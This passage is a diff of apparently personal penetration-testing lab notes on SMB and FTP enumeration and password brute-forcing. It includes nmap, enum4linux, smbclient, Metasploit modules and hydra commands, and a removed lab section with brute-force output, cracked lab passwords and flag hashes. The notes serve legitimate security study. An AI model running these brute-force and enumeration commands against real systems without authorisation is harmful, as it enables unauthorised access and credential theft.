-		  .                                   D        0  Tue May 16 07:35:39 2023
-		  ..                                  D        0  Tue Nov 27 13:36:13 2018
-		  dev                                 D        0  Tue Nov 27 13:36:13 2018
-		  secret                              D        0  Tue Nov 27 13:36:13 2018
-
-   
-   
-   
-9.  Fetch the flag from samba server. 
-
-03ddb97933e716f5057a18632badb3b4 
-
-
-use more to read content and q to get out of 
-![[Pasted image 20230516101232.png]]
+-  `nmap {target ip} -p 445 --script smb-enum-shares `
+-  `use auxiliary/scanner/smb/smb_enumshares `
+-  `enum4linux -S {ip} `
+- `smbclient -L {target} -N`   (-N = nullsession)
+- `enum4linux -G {target} `
+- `rpcclient -U "" -N {target}`
+	- `enumdomgroups`
+-  `smbclient //target/Public -N `
 
 
 #### SMB Dictonary Attack 
 - wordlist = list of passwords e.g. rocky 
 - Enumerate smb share: 
-	- run: msfconsole 
-	- use auxiliary/scanner/smb/smb_login 
-	- info (uitleg van module)
-	- options 
-	- set rhosts {target} 
-	- set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt 
-	- set smbuser {jane}
-	- options 
-	- run 
-	- exit 
-- run this commmand first: *gzip -d /usr/share/wordlists/rockyou.txt.gz* 
-		Specifiek wordt hier het bestand "rockyou.txt.gz" uitgepakt, dat zich bevindt in de map "/usr/share/wordlists/". Na uitvoering van dit commando zal het zip bestand "rockyou.txt.gz" worden uitgepakt en zal het resulterende ongecomprimeerde bestand "rockyou.txt" in dezelfde map worden geplaatst. Het ".gz" -extensie geeft aan dat het bestand gecomprimeerd is met gzip-compressie 
-- run: *hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz  {target} smb*
-			- de tool Hydra wordt gebruikt om een aanval uit te voeren op een inlogpagina met behulp van een lijst met wachtwoorden.
-			-  "-l admin" geeft aan dat de gebruikersnaam die wordt gebruikt tijdens de aanval "admin" is. Dit kan worden gewijzigd naar de gewenste gebruikersnaam. De vlag '-l' wordt gebruikt om de gebruikersnaam op te geven die wordt gebruikt tijdens het uitvoeren van een aanval. 
-			-  -P /usr/share/wordlists/rockyou.txt.gz" geeft de locatie aan van het wachtwoordenbestand dat zal worden gebruikt tijdens de aanval. In dit geval wordt het bestand "rockyou.txt.gz" gebruikt, dat zich bevindt in de map "/usr/share/wordlists/". Dit bestand bevat een lijst met mogelijke wachtwoorden die worden uitgepakt door het commando. De vlag '-P' wordt gebruikt om het wachtwoordenbestand op te geven dat wordt gebruikt tijdens het uitvoeren van de aanval. 
-- run: *smbmap -H {target} -u admin -p password1* 
-- find out of any of the share are browsable: ***smbclient -L {target} -U jane  (password is 123abc)***
-- run: **smbclient //target/jane -U jane** 
-- ls 
-- run: **smbclient //target/admin -U admin** 
-![[Pasted image 20230516103627.png]]
-- first get file then **exit smb > ls > use tar -xf flag.tar.gz** 
-	- Het commando "tar -xf flag.tar.gz" wordt gebruikt om een gecomprimeerd archiefbestand met de extensie ".tar.gz" uit te pakken met behulp van het programma 'tar'. 
-	- -   "tar" is het opdrachtregelhulpprogramma dat wordt gebruikt voor het beheren van archiefbestanden.
-	-  "-xf" zijn de opties voor 'tar':
-	    -   De optie 'x' staat voor extract, wat betekent dat we het archief willen uitpakken.
-	    -   De optie 'f' gevolgd door het bestandsnaamargument "flag.tar.gz" geeft aan dat we het specifieke archiefbestand willen uitpakken.
-- enumerate pipes: 
 	- msfconsole 
-	- **use auxiliary/scanner/smb/pipe_auditor** 
-		- The "msfconsole: auxiliary/scanner/smb/pipe_auditor" module in Metasploit is used for auditing named pipes on remote systems accessible via the Server Message Block (SMB) protocol. It attempts to discover vulnerable or misconfigured named pipes that can be exploited for unauthorized access or information disclosure. 
-		- pipeline auditing refers to the process of examining and evaluating the security and configuration of named pipes in a system or network. Named pipes are a form of interprocess communication (IPC) mechanism that allows communication between different processes or applications on a system.
-		  
-	- set smbuser admin 
-	- set smbpass password1 
-	- set rhost target 
-	- options 
-	- run 
-- Get a list of SID: **enum4linux -r -u "admin" -p "password1" {target}** 
-	-   "-r": This option tells enum4linux to perform a recursive enumeration, which means it will explore all possible shares and domains.
-	-   "-u 'admin'": This option specifies the username to be used for authentication.
-	-   "-p 'password1'": This option specifies the password to be used for authentication.
+	- use auxiliary/scanner/smb/smb_login 
+	
+- `gzip -d /usr/share/wordlists/rockyou.txt.gz `
+		
+- `*hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz  {target} smb*`
+- `*smbmap -H {target} -u admin -p password1* `
+- ` ***smbclient -L {target} -U jane  (password is 123abc)***`
+-  `smbclient //target/jane -U jane `
+- `smbclient //target/admin -U admin `
+![[Pasted image 20230516103627.png]]
+- ` exit smb > ls > use tar -xf flag.tar.gz `
+- enumerate pipes: 
+	- `msfconsole `
+	- `use auxiliary/scanner/smb/pipe_auditor `
+	
+- `**enum4linux -r -u "admin" -p "password1" {target}** `
+	
 
-
----- stappenplan 
+stappenplan 
 
 1.  Enumerate SMB shares:
-    
-    -   Open a terminal and run: `msfconsole`
-    -   Inside the Metasploit console, run: `use auxiliary/scanner/smb/smb_login`
-    -   Set the target host with: `set rhosts {target}`
-    -   Set the password file with: `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
+    -    `msfconsole`
+		 `use auxiliary/scanner/smb/smb_login``
+	    Set the password file with: `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
     -   Set the SMB username with: `set smbuser {jane}`
     -   Run: `options` to confirm the settings
 2.  Decompress the wordlist:
@@ -742,156 +215,17 @@ use more to read content and q to get out of
 9.  Get a list of SIDs:
     -   Run: `enum4linux -r -u "admin" -p "password1" {target}`
 
----- LAB ---- 
-
-
-**target ip: 192.57.201.3** 
-
-1.  What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt
-   
-		msf5 auxiliary(scanner/smb/smb_login) > run
-		
-		[] 192.57.201.3:445      - 192.57.201.3:445 - Starting SMB login bruteforce
-		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:admin',
-		[!] 192.57.201.3:445      - No active DB -- Credential data will not be saved!
-		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:123456',
-		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:12345',
-		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:123456789',
-		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:password',
-		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:iloveyou',
-		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:princess',
-		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:1234567',
-		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:12345678',
-		[+] 192.57.201.3:445      - 192.57.201.3:445 - Success: '.\jane:abc123'  📍
-		[] 192.57.201.3:445      - Scanned 1 of 1 hosts (100% complete)
-		[] Auxiliary module execution completed
-
-
-   
-2.  What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
-		   
-		root@attackdefense:~# gzip -d  /usr/share/wordlists/rockyou.txt.gz 
-		root@attackdefense:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.57.201.3 smb
-		Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-		
-		Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-16 10:10:24
-		[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
-		[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
-		[DATA] attacking smb://192.57.201.3:445/
-		[445][smb] host: 192.57.201.3   login: admin   password: password1
-		1 of 1 target successfully completed, 1 valid password found
-		Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-16 10:10:26
-
-   
-3.  Which share is read only? Use smbmap with credentials obtained in question 2.
-		   
-		   
-		root@attackdefense:~# smbmap -H 192.57.201.3 -u admin -p password1
-		[+] Finding open SMB ports....
-		[+] User SMB session establishd on 192.57.201.3...
-		[+] IP: 192.57.201.3:445        Name: target-1                                          
-		        Disk                                                    Permissions
-		        ----                                                    -----------
-		        shawn                                                   READ, WRITE
-		        nancy                                                   READ ONLY 📍
-		        admin                                                   READ, WRITE
-		        IPC$                                                    NO ACCESS
-
-
-
-4.  Is share “jane” browseable? Use credentials obtained from the 1st question. Yes! 
-   
-
-		   root@attackdefense:~# smbclient -L 192.57.201.3 -U jane 
-		Enter WORKGROUP\jane's password: abc123
-		
-		        Sharename       Type      Comment
-		        ---------       ----      -------
-		        shawn           Disk      
-		        nancy           Disk      
-		        admin           Disk      
-		        IPC$            IPC       IPC Service (brute.samba.recon.lab)
-		Reconnecting with SMB1 for workgroup listing.
-		
-		        Server               Comment
-		        ---------            -------
-		
-		        Workgroup            Master
-		        ---------            -------
-		        RECONLABS            
-	
-   
-   
-   
-5.  Fetch the flag from share “admin”
-   
-
-2727069bc058053bd561ce372721c92e
-![[Pasted image 20230516122153.png]]
-   
-   
-6.  List the named pipes available over SMB on the samba server? Use  pipe_auditor metasploit module with credentials obtained from question 2.
-   
-		   
-		msf5 > use auxiliary/scanner/smb/pipe_auditor 
-		msf5 auxiliary(scanner/smb/pipe_auditor) > set smbuser admin
-		smbuser => admin
-		msf5 auxiliary(scanner/smb/pipe_auditor) > set smbpass password1
-		smbpass => password1
-		msf5 auxiliary(scanner/smb/pipe_auditor) > set rhosts 192.57.201.3
-		rhosts => 192.57.201.3
-		msf5 auxiliary(scanner/smb/pipe_auditor) > options
-		
-		Module options (auxiliary/scanner/smb/pipe_auditor):
-		
-		   Name         Current Setting                                                 Required  Description
-		   ----         ---------------                                                 --------  -----------
-		   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
-		   RHOSTS       192.57.201.3                                                    yes       The target address range or CIDR identifier
-		   SMBDomain    .                                                               no        The Windows domain to use for authentication
-		   SMBPass      password1                                                       no        The password for the specified username
-		   SMBUser      admin                                                           no        The username to authenticate as
-		   THREADS      1                                                               yes       The number of concurrent threads
-		
-		msf5 auxiliary(scanner/smb/pipe_auditor) > run
-		
-		[+] 192.57.201.3:139      - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
-		[*] 192.57.201.3:         - Scanned 1 of 1 hosts (100% complete)
-		[*] Auxiliary module execution completed
-
-
-
-
-   
-7.  List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2.
-
-`-R`: This option enables RID cycling, which means enum4linux will attempt to enumerate user SIDs by cycling through a range of RID values.
-
-		S-1-22-1-1000 Unix User\shawn (Local User)
-		S-1-22-1-1001 Unix User\jane (Local User)
-		S-1-22-1-1002 Unix User\nancy (Local User)
-		S-1-22-1-1003 Unix User\admin (Local User)
-
 
 ---- 
 
 ####  FTP 
 
-- File transfer protocol 
-- run nmap scan 
-- hone in on open ftp port with opering scan and service scan: **nmap {target} -p 21 -sV -0** 
-	- -   `-p 21`: This option specifies that only port 21 (FTP) should be scanned. The `-p` option followed by the port number restricts the scan to that specific port. In this case, port 21 is being scanned.
-	-   `-sV`: This option enables service/version detection. Nmap will attempt to determine the service running on the scanned port and provide information about the version of the service if possible.
-	-   `-O`: This option enables operating system detection. Nmap will try to identify the operating system running on the target system by analyzing various network characteristics and responses.
-- run: **hydra -L /usr/share/metasploit-framework/data/wordlist/common_users.txt -P /usr.share.metasploit-framework/data/wordlist/unix_passwords.txt {target ip} {service}** 
-	- -   `hydra`: This is the command to run Hydra, a popular online password cracking tool.
-	-   `-L /usr/share/metasploit-framework/data/wordlist/common_users.txt`: This option specifies the path to the username wordlist file to be used during the brute-force attack. 
-	-   `-P /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt`: This option specifies the path to the password wordlist file to be used during the brute-force attack.
-	-   `{service}`: Replace this with the specific service you want to target during the brute-force attack. Examples include `ssh`, `ftp`, `telnet`, etc.
-- run: ftp {ip}  (use credentials from the results from the hydra scan)
-- get {secret file}
-	- exit ftp server with: bye 
-	- cat file 
+- nmap  
+-  `nmap {target} -p 21 -sV -0`
+- `hydra -L /usr/share/metasploit-framework/data/wordlist/common_users.txt -P /usr.share.metasploit-framework/data/wordlist/unix_passwords.txt {target ip} {service}` 
+- `ftp {ip}`  (use credentials from the results from the hydra scan)
+- `get` 
+
 	  
 
 - echo "sysadmin" > users 
